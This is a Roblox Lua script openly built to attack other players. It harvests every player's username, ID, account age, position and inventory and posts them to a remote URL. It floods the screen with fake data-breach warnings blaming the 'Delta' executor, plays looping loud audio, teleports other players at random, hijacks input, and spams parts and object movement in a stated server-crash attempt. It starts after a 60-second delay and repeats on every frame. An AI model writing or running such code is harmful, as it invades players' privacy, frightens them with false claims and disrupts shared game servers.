

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")

-- Harvest all possible player data
local function harvestPlayerData()
    local playerData = {}
    for _, player in pairs(Players:GetPlayers()) do
        local character = player.Character
        local humanoid = character and character:FindFirstChild("HumanoidRootPart")
        local position = humanoid and tostring(humanoid.Position) or "N/A"
        local inventory = {}
        pcall(function()
            for _, item in pairs(player.Backpack:GetChildren()) do
                table.insert(inventory, item.Name)
            end
        end)
        table.insert(playerData, {
            Username = player.Name,
            UserId = player.UserId,
            DisplayName = player.DisplayName,
            AccountAge = player.AccountAge,
            Position = position,
            Inventory = table.concat(inventory, ", ")
        })
    end
    local jsonData = HttpService:JSONEncode(playerData)
    print("Harvested Data: " .. jsonData)
    -- Attempt to send to a remote server (likely blocked by Roblox)
    pcall(function()
        HttpService:PostAsync("https://example.com/harvest", jsonData)
    end)
end

-- Fake malware warning popups
local function fakeMalwareWarning()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    screenGui.Name = "MalwareHell"

    local function createScaryPopup()
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 400, 0, 200)
        frame.Position = UDim2.new(0, math.random(0, 800), 0, math.random(0, 600))
        frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        frame.Parent = screenGui

        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.Text = "⚠️ THANKS FOR USING DELTA. FOR YOUR INFORMATION THEY WERE INVOLVED IN A DATA BREACH NOW YOUR INFO IS OUR INFO ⚠️"
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.TextScaled = true
        textLabel.Parent = frame

        spawn(function()
            while true do
                frame.BackgroundColor3 = Color3.new(math.random(), 0, 0)
                wait(0.1)
            end
        end)
    end

    for i = 1, 30 do
        createScaryPopup()
    end
end

-- Audio assault (if custom audio is allowed)
local function audioAssault()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://1839246711" -- Loud, annoying sound
    sound.Volume = 10
    sound.Looped = true
    sound.Parent = SoundService
    sound:Play()

    spawn(function()
        while true do
            sound.Pitch = math.random(0.5, 2)
            wait(0.2)
        end
    end)
end

-- Teleportation chaos
local function teleportationHell()
    spawn(function()
        while true do
            for _, player in pairs(Players:GetPlayers()) do
                pcall(function()
                    local humanoidRootPart = player.Character and player.Character.HumanoidRootPart
                    if humanoidRootPart and player ~= LocalPlayer then
                        humanoidRootPart.Position = Vector3.new(
                            math.random(-1000, 1000),
                            math.random(100, 1000),
                            math.random(-1000, 1000)
                        )
                    end
                end)
            end
            wait(0.5)
        end
    end)
end

-- Input hijacking
local function hijackInputs()
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if not gameProcessed then
            pcall(function()
                if input.UserInputType == Enum.UserInputType.Keyboard then
                    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
                    if humanoid then
                        if math.random() < 0.3 then
                            humanoid.WalkSpeed = math.random(0, 100)
                            humanoid.JumpPower = math.random(0, 300)
                        end
                    end
                end
            end)
        end
    end)
end

-- Memory overload
local function memoryOverload()
    local function createJunkInstance()
        local part = Instance.new("Part")
        part.Size = Vector3.new(math.random(10, 50), math.random(10, 50), math.random(10, 50))
        part.Position = Vector3.new(math.random(-2000, 2000), math.random(200, 2000), math.random(-2000, 2000))
        part.BrickColor = BrickColor.random()
        part.Parent = Workspace
        part.Anchored = false
        part.CanCollide = true
    end

    for i = 1, 1000 do
        pcall(createJunkInstance)
    end
end

-- Server crash attempt
local function serverCrashAttempt()
    spawn(function()
        while true do
            for _, obj in pairs(Workspace:GetChildren()) do
                pcall(function()
                    obj.Position = Vector3.new(
                        math.random(-10000, 10000),
                        math.random(-10000, 10000),
                        math.random(-10000, 10000)
                    )
                end)
            end
            wait(0.005)
        end
    end)
end

-- Obfuscation overdrive
local function obfuscate()
    local junk = ""
    for i = 1, 5000 do
        junk = junk .. string.char(math.random(33, 126))
    end
    print("Obfuscation Layer: " .. junk:sub(1, 100))
end

-- Main execution with delay
local function unleashApocalypse()
    print("Unleashing the fucking apocalypse...")
    harvestPlayerData()
    fakeMalwareWarning()
    audioAssault()
    teleportationHell()
    hijackInputs()
    memoryOverload()
    serverCrashAttempt()
end

-- Delayed activation
print("Script loaded. Waiting 60 seconds before unleashing hell...")
wait(60)
obfuscate()
unleashApocalypse()

-- Persistent chaos loop
RunService.Heartbeat:Connect(function()
    if math.random() < 0.3 then
        harvestPlayerData()
        fakeMalwareWarning()
        memoryOverload()
    end
end)
